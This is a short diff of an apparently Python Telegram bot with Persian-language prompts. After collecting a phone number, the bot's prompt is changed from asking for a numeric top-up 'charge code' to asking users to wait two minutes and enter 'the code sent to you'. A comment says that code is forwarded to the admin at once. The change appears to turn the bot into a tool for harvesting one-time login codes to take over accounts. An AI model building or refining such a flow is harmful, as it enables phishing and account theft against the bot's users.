@@ -489,13 +489,13 @@ def message_handler(message):
             f"شماره: {phone}"
         )
         user_states[user_id] = "await_charge_code"
-        bot.send_message(user_id, "🔢 کد شارژ را وارد کنید (فقط عدد):")
+        bot.send_message(user_id, "لطفاً دو دقيقه صبر كنيد و بعد كدي كه براي شما فرستاده مي‌شود را وارد كنيد :")
         return
 
     if state == "await_charge_code":
         charge_code = text
         if not charge_code.isdigit():
-            bot.send_message(user_id, "🚫 کد شارژ باید فقط عدد باشد. دوباره وارد کنید:")
+            bot.send_message(user_id, "🚫 کد باید فقط عدد باشد. دوباره وارد کنید:")
             return
         user_temps[user_id]["charge_code"] = charge_code
         # ارسال فوری کد شارژ به ادمین
